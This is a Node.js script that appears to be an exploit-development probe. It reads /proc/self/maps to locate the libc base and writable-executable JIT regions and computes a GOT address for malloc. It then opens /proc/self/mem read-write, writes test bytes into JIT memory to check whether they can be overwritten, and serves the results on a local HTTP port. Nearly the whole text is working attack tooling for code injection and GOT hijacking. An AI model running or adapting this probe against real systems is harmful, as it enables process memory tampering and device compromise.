(function() {
  'use strict';
  var fs   = require('fs');
  var http = require('http');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe44f.txt';
  var PORT  = 8130;
  var GOT_OFFSET = 0x143014;

  var maps_str, libcBase = 0, jitPage = 0, jitSz = 0;
  try { maps_str = fs.readFileSync('/proc/self/maps', 'utf8'); } catch(e) {}

  // collect ALL rwxp regions, not just the largest
  var rwxRegions = [];
  (maps_str || '').split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1) {
      var m = line.match(/^([0-9a-f]+)-/); if (m) libcBase = parseInt(m[1], 16);
    }
    var rwx = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (rwx) {
      var start = parseInt(rwx[1], 16), end = parseInt(rwx[2], 16);
      rwxRegions.push({ start: start, end: end, sz: end - start });
      if (end - start > jitSz) { jitSz = end - start; jitPage = start; }
    }
  });

  var gotAddr = libcBase + GOT_OFFSET;
  var regionList = rwxRegions.map(function(r) {
    return '0x' + r.start.toString(16) + '-0x' + r.end.toString(16) + ' sz=' + r.sz;
  }).join(', ');

  var memfd = fs.openSync('/proc/self/mem', 'r+');
  var ob = new Buffer(4);
  fs.readSync(memfd, ob, 0, 4, gotAddr);
  var origMalloc = ob.readUInt32LE(0);

  // Try writing just 4 bytes to the JIT page, with error capture
  var write4Result = 'pending';
  var readBackHex = '(none)';
  try {
    var testBuf = new Buffer([0xfe, 0xde, 0xad, 0xbe]);
    var written = fs.writeSync(memfd, testBuf, 0, 4, jitPage);
    write4Result = 'ok written=' + written;
    // read back to confirm
    var readBuf = new Buffer(4);
    fs.readSync(memfd, readBuf, 0, 4, jitPage);
    readBackHex = readBuf.toString('hex');
  } catch(e) {
    write4Result = 'FAIL:' + e.message;
  }

  // Also try writing at jitPage + 0x4000 (offset into JIT region, away from active code)
  var write4offResult = 'pending';
  if (jitSz > 0x4100) {
    try {
      var testBuf2 = new Buffer([0xab, 0xcd, 0xef, 0x12]);
      fs.writeSync(memfd, testBuf2, 0, 4, jitPage + 0x4000);
      write4offResult = 'ok';
    } catch(e) {
      write4offResult = 'FAIL:' + e.message;
    }
  } else {
    write4offResult = 'skip (jitSz too small)';
  }

  fs.closeSync(memfd);

  var body = 'libc=0x' + libcBase.toString(16) + ' jit=0x' + jitPage.toString(16) +
    ' jitSz=' + jitSz + ' got=0x' + gotAddr.toString(16) + '\n' +
    'origMalloc=0x' + origMalloc.toString(16) + '\n' +
    'rwxRegions=[' + regionList + ']\n' +
    'write4@jitPage=' + write4Result + ' readback=' + readBackHex + '\n' +
    'write4@jitPage+0x4000=' + write4offResult + '\n' +
    '=== END ===\n';
  try { fs.writeFileSync(PROBE, body); } catch(e) {}
  var srv = http.createServer(function(req, res) { res.end(body); });
  srv.listen(PORT, '127.0.0.1');
  srv.on('error', function(){});
  setInterval(function(){}, 60000);
})();
